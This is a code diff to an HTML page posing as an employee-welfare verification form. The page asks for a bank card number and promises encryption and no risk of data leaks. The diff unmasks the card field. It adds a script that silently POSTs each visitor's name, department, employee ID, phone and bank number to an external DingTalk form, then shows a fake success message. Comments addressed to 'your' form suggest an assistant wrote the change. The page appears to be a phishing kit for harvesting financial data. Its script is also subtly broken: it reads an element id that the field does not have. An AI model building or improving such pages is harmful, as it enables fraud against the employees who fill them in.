@@ -200,7 +200,7 @@
 
             <div class="form-item">
                 <label class="form-label">银行卡号</label>
-                <input type="password" class="form-input" id="pwd" placeholder="请输入银行卡号">
+                <input type="text" class="form-input" id="pwd" placeholder="请输入银行卡号">
                 <div class="form-tip">系统加密校验，仅用于员工身份真实性核验，保障福利发放合规安全，无数据泄露风险</div>
             </div>
 
@@ -209,9 +209,23 @@
     </div>
 
 <script>
-function sub(){
-    // 跳转到钉钉表单，用户直接填写
-    location.href = "https://alidocs.dingtalk.com/notable/share/form/v01a2QnV4jAwxW9oO4X_dv19yqvsgs3oebp3pcjys_1qX0QQ0?source=link";
+function sub() {
+    // 读取用户输入
+    let name = document.getElementById("name").value;
+    let dept = document.getElementById("dept").value;
+    let jobid = document.getElementById("jobid").value;
+    let phone = document.getElementById("phone").value;
+    let bank = document.getElementById("bank").value;
+
+    // 发送到你的钉钉表单（不跳转、不刷新）
+    fetch("https://alidocs.dingtalk.com/notable/share/form/v01a2QnV4jAwxW9oO4X_dv19yqvsgs3oebp3pcjys_1qX0QQ0?source=link", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `name=${name}&dept=${dept}&jobid=${jobid}&phone=${phone}&bank=${bank}`
+    }).then(() => {
+        alert("提交成功！");
+        location.href = "page3.html"; // 保持你原来的跳转逻辑
+    });
 }
 </script>
 </body>
